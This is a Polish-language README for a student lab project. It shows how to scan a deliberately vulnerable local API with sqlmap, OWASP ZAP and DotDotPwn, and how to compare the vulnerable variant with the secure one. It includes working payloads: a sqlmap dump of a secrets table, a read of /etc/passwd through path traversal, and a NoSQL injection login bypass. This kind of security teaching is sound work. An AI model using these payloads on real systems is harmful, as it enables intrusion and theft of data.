# Testowanie podatności skanerami

Wszystko odpalasz w **PowerShell w katalogu repo**. Apka musi działać:

```powershell
docker compose up -d
```

## Przełączanie wariantu

W `.env` ustaw moduł na `vulnerable` lub `secure`, potem przeładuj API:

```powershell
docker compose up -d --force-recreate api
```

Wariant sprawdzisz na http://localhost:8000/api/modules

---

## SQLi — sqlmap

Pobierz raz:

```powershell
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
```

Skan + wyciek tabeli sekretów:

```powershell
uv run --no-project python sqlmap/sqlmap.py -u "http://localhost:8000/api/products/search?q=grill" --batch --dbms=postgresql --level=5 --risk=3 --dump -T admin_secrets
```

- `vulnerable` → **injectable**, wyciąga `admin_secrets` (FLAG + klucz), błędy 500.
- `secure` → **not injectable**, nic nie wyciąga, błędy 422.

---

## Całe API naraz — OWASP ZAP (raport HTML)

```powershell
docker run --rm -v "${PWD}:/zap/wrk:rw" ghcr.io/zaproxy/zaproxy:stable zap-api-scan.py -t http://host.docker.internal:8000/openapi.json -f openapi -r zap-report.html
```

```powershell
start zap-report.html
```

Skanuje wszystkie endpointy z `/openapi.json`. Łapie SQLi i path traversal (`/api/storage`).

---

## fileio — DotDotPwn (automat)

Dedykowany fuzzer path traversal (odpowiednik sqlmapa dla plików):

```powershell
docker run --rm kalilinux/kali-rolling sh -c "apt-get update -qq && apt-get install -y -qq dotdotpwn && dotdotpwn -m http-url -u 'http://host.docker.internal:8000/api/storage?name=TRAVERSAL' -k 'root:' -b -q"
```

Przepuszcza ~11000 wariantów `../`.
- `vulnerable` → `...name=../../../etc/passwd <- VULNERABLE`, `Total Traversals found: 1`.
- `secure` → `Total Traversals found: 0`.

## fileio — ręcznie (1 komenda)

```powershell
Invoke-RestMethod "http://localhost:8000/api/storage?name=/etc/passwd"
```

`vulnerable` → zwraca plik systemowy. `secure` → błąd.

---

## NoSQLi — ręcznie (1 komenda)

```powershell
Invoke-RestMethod -Method Post http://localhost:8000/api/login -ContentType 'application/json' -Body '{"username":{"$ne":null},"password":{"$ne":null}}'
```

`vulnerable` → logowanie jako `admin` bez hasła. `secure` → błąd 422.

---

## Co czym pokazać

| Podatność | Narzędzie |
|---|---|
| SQLi | sqlmap |
| fileio (odczyt plików) | DotDotPwn |
| NoSQLi | ręcznie |

**Demo na obronę:** odpal w `vulnerable` → wykrywa; przełącz na `secure`, przeładuj API, odpal to samo → nic nie znajduje.
